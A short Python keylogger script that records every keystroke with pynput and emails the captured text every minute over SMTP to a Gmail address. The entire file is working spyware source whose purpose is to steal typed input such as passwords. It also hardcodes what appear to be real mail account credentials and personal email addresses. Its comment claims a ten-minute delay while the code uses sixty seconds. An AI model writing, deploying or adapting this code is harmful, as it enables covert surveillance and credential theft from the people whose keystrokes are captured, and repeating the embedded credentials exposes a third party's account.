from pynput.keyboard import Listener
import smtplib
from threading import Timer
 
msg = ''
 
def on_press(key):
    global msg
    k = str(key).replace("'", "")
     
    if k == 'Key.enter':
        msg += "[ENTER]\n"
    elif k == 'Key.backspace':
        msg = msg[:-1] 
    elif k == 'Key.shift':
        msg += '^'
    elif k == 'Key.delete':
        msg += '[DEL]'
    else:
        msg += k
 
def send():
    global msg
    if len(msg)>0:
        server.sendmail("jatin@cyberdrunk.in", "jatinraj.091199@gmail.com", msg)
    Timer(60.0, send).start()
 
#keyboard listening
listener = Listener(on_press=on_press)
listener.start()
 
#connecting to smtp server
server=smtplib.SMTP('imap.secureserver.net',993)
server.starttls()
server.login("jatin@cyberdrunk.in","V%D8*9V8%F5s$^aD#u")
 
#start sending function after 10 minutes
Timer(60.0, send).start()
